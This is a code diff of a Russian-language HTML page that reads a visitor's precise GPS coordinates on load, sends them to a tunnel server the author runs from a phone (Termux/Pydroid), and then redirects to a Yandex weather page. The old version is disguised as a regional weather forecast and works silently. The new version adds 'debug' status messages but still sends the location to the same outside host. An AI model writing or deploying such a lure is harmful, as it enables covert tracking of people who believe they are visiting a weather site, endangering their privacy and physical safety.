@@ -1,39 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Погода в вашем регионе</title>
+    <title>Проверка соединения...</title>
     <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body style="font-family: sans-serif; text-align: center; margin-top: 50px; background-color: #f0f4f8; padding: 20px;">
+
+    <h2>Отладка геопозиции</h2>
+    <div id="status-box" style="background: white; border-radius: 8px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); display: inline-block; text-align: left; min-width: 280px;">
+        <p id="step1">⏳ Проверка поддержки GPS... </p>
+        <p id="step2">⏳ Запрос координат у браузера... </p>
+        <p id="step3">⏳ Отправка на сервер... </p>
+    </div>
+
     <script>
-        // ТВОЯ АКТУАЛЬНАЯ ССЫЛКА ИЗ TERMUX
+        // ТВОЯ АКТУАЛЬНАЯ ССЫЛКА ИЗ TERMUX (Проверь буквы!)
         const SERVO_URL = "https://c5a59e4815fddadd-31-8-29-192.serveousercontent.com";
 
-        function getGPS() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
+        const s1 = document.getElementById('step1');
+        const s2 = document.getElementById('step2');
+        const s3 = document.getElementById('step3');
 
-                        // Пересылаем данные на твой сервер в Pydroid
-                        fetch(`${SERVO_URL}/log_gps?lat=${lat}&lon=${lon}`)
-                            .finally(() => {
-                                window.location.href = "https://pogoda.yandex.ru";
-                            });
-                    },
-                    (error) => {
-                        window.location.href = "https://pogoda.yandex.ru";
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-            } else {
-                window.location.href = "https://pogoda.yandex.ru";
+        function startCheck() {
+            if (!navigator.geolocation) {
+                s1.innerHTML = "❌ Браузер вообще не поддерживает геолокацию.";
+                return;
             }
+            s1.innerHTML = "✅ Геолокация поддерживается браузером.";
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    s2.innerHTML = "✅ Координаты успешно получены от GPS!";
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+
+                    s3.innerHTML = "⏳ Отправка в Pydroid...";
+                    
+                    fetch(`${SERVO_URL}/log_gps?lat=${lat}&lon=${lon}`)
+                        .then(() => {
+                            s3.innerHTML = "✅ Данные ушли в Pydroid! Перенаправление...";
+                            setTimeout(() => { window.location.href = "https://pogoda.yandex.ru"; }, 1500);
+                        })
+                        .catch((err) => {
+                            s3.innerHTML = "❌ Ошибка сети: Сервер в Pydroid недоступен (проверь туннель).";
+                        });
+                },
+                (error) => {
+                    // Разбираем причину отказа браузера
+                    if (error.code === 1) {
+                        s2.innerHTML = "❌ Ошибка: ДОСТУП ЗАПРЕЩЕН. Браузер блокирует запрос. Зайди в настройки сайтов в Chrome и сбрось запрет геопозиции для github.io.";
+                    } else if (error.code === 2) {
+                        s2.innerHTML = "❌ Ошибка: Положение недоступно. Убедись, что на самом телефоне в шторке включена кнопка 'Геолокация/GPS'.";
+                    } else if (error.code === 3) {
+                        s2.innerHTML = "❌ Ошибка: Таймаут. Спутники слишком долго не отвечали.";
+                    } else {
+                        s2.innerHTML = "❌ Неизвестная ошибка GPS: " + error.message;
+                    }
+                },
+                { enableHighAccuracy: true, timeout: 15000 }
+            );
         }
-        window.onload = getGPS;
+
+        window.onload = startCheck;
     </script>
-</head>
-<body style="font-family: sans-serif; text-align: center; margin-top: 100px; background-color: #f0f4f8;">
-    <h2>Определение автоматического региона для прогноза погоды...</h2>
-    <p>Пожалуйста, подождите, идет оптимизация соединения.</p>
 </body>
 </html>
